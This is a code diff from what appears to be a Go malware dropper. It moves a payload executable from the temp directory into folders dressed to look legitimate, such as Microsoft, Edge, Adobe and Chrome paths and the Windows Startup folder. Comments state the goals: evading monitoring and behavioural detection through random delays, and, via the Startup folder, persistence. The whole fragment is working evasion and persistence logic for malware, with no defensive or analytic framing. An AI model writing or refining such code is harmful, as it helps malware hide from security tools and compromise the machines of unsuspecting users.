@@ -28,10 +28,25 @@ func main() {
 		return
 	}
 
-	// Write payload to temp location with random name
-	tempDir := os.TempDir()
+	// Write payload to a legitimate-looking location
+	// Option 1: AppData\Local (less monitored than Temp)
+	appData := os.Getenv("LOCALAPPDATA")
+
+	// Create fake legitimate folder structure
+	legitimateFolders := []string{
+		filepath.Join(appData, "Microsoft", "Windows", "WinX"),
+		filepath.Join(appData, "Microsoft", "Edge", "User Data"),
+		filepath.Join(appData, "Adobe", "Acrobat", "DC"),
+		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
+		filepath.Join(appData, "Google", "Chrome", "User Data", "SwReporter"),
+	}
+
+	// Pick random legitimate folder
+	dropDir := legitimateFolders[time.Now().Unix()%int64(len(legitimateFolders))]
+	os.MkdirAll(dropDir, 0755)
+
 	randomName := generateRandomName() + ".exe"
-	tempPath := filepath.Join(tempDir, randomName)
+	tempPath := filepath.Join(dropDir, randomName)
 
 	// Write with random delays to avoid behavioral detection
 	time.Sleep(time.Duration(2+time.Now().Unix()%3) * time.Second)
